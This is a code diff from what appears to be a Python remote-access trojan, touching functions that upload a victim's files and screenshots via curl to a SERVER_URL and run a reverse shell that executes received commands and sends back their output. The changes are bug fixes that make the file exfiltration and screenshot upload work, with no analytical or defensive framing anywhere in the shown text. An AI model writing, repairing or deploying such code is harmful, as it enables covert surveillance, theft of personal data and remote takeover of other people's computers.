@@ -78,9 +78,7 @@ def get_files(args):
         try:
             with open(file_path, "rb"):
                 valid_files.append(file_path)
-        except FileNotFoundError:
-            return False
-        except Exception as e:
+        except:
             return False
     if not valid_files:
         return False
@@ -89,11 +87,11 @@ def get_files(args):
         curl_cmd.extend(["-F", f"files=@{file_path}"])
     curl_cmd.append(f"{SERVER_URL}/upload")
     try:
-        result = subprocess.run(curl_cmd,shell=True, capture_output=True, text=True)
-        if result.stderr:
+        result = subprocess.run( curl_cmd,capture_output=True)
+        if result.returncode != 0:
             return False
         return True
-    except Exception as e:
+    except:
         return False
 def get_screenshot():
     screenshot = ImageGrab.grab()
@@ -103,10 +101,10 @@ def get_screenshot():
     curl_command = [
         "curl",
         "-X", "POST",
-        "-F", "files=@-;filename=screenshot.png", 
+        "-F", "files=@-;filename=screenshot.png",
         f"{SERVER_URL}/upload"
     ]
-    subprocess.run(curl_command, input=buf.read(), capture_output=True,shell=True,text=True)
+    subprocess.run(curl_command,input=buf.read(),capture_output=True)
     return True
 def get_location():
     location = None
@@ -196,12 +194,7 @@ def reverse_shell_payload():
            if cmd.lower() == "exit":
                break
            else:
-               output = subprocess.run(
-                   cmd,
-                   shell=True,
-                   capture_output=True,
-                   text=True
-               )
+               output = subprocess.run(cmd,shell=True,capture_output=True,text=True)
                result = output.stdout + output.stderr
                if result:
                    s.send(result.encode())
